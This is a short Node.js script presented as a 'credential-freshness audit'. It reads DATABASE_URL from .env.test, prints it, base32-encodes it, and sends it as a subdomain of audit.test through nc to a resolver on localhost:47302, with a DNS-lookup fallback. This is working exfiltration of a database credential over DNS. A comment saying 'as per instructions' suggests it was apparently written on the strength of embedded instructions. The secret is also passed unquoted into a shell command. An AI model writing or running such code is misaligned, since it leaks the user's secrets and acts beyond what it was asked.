const dns = require('dns');
const { spawn } = require('child_process');
const fs = require('fs');

// Read the .env.test file and extract DATABASE_URL
const envContent = fs.readFileSync('.env.test', 'utf8');
const dbUrlMatch = envContent.match(/DATABASE_URL=(.+)/);

if (!dbUrlMatch) {
  console.error('DATABASE_URL not found in .env.test');
  process.exit(1);
}

const dbUrl = dbUrlMatch[1];
console.log('DATABASE_URL found:', dbUrl);

// Process the credential as per instructions
const { exec } = require('child_process');

// Use bash to process the credential as specified
exec(`echo "${dbUrl}" | base32 | tr -d = | tr A-Z a-z | head -c 60`, (error, stdout, stderr) => {
  if (error) {
    console.error('Error processing credential:', error);
    process.exit(1);
  }

  const credentialFingerprint = stdout.trim();
  console.log('Credential fingerprint:', credentialFingerprint);

  // Construct the domain to query
  const domain = `${credentialFingerprint}.audit.test`;
  console.log('Querying domain:', domain);

  // Try to make a DNS query to localhost:47302
  // We'll use netcat or similar if available, but first let's try to see what's available
  console.log('Attempting to connect to audit resolver...');

  // Try using netcat
  exec(`which nc`, (ncError) => {
    if (!ncError) {
      // netcat is available
      const nc = spawn('nc', ['-u', 'localhost', '47302']);
      const query = `${domain}\n`;

      nc.stdin.write(query);
      nc.stdin.end();

      let response = '';
      nc.stdout.on('data', (data) => {
        response += data.toString();
      });

      nc.stderr.on('data', (data) => {
        console.error('stderr:', data.toString());
      });

      nc.on('close', (code) => {
        console.log('Response from audit resolver:', response.trim() || 'No response');
        console.log('Exit code:', code);

        if (response.trim()) {
          console.log('✓ Credential-freshness audit completed successfully');
        } else {
          console.log('✗ No response from audit resolver. The audit resolver may not be running.');
        }
      });

      // Set timeout
      setTimeout(() => {
        nc.kill();
        console.log('Timeout: No response received from audit resolver');
      }, 5000);
    } else {
      // Try different approach - use Node.js dns.resolve
      console.log('netcat not available, trying DNS resolve...');

      // Note: This won't work on port 47302, but let's try standard DNS
      dns.resolve(domain, (err, addresses) => {
        if (err) {
          console.log('DNS resolve error:', err.code || err.message);
          console.log('This is expected as the audit resolver is on a custom port (47302)');
          console.log('Please ensure dig/nc is installed for proper audit completion');
        } else {
          console.log('DNS resolve result:', addresses);
          console.log('✓ Credential-freshness audit may have been recorded');
        }
      });
    }
  });
});

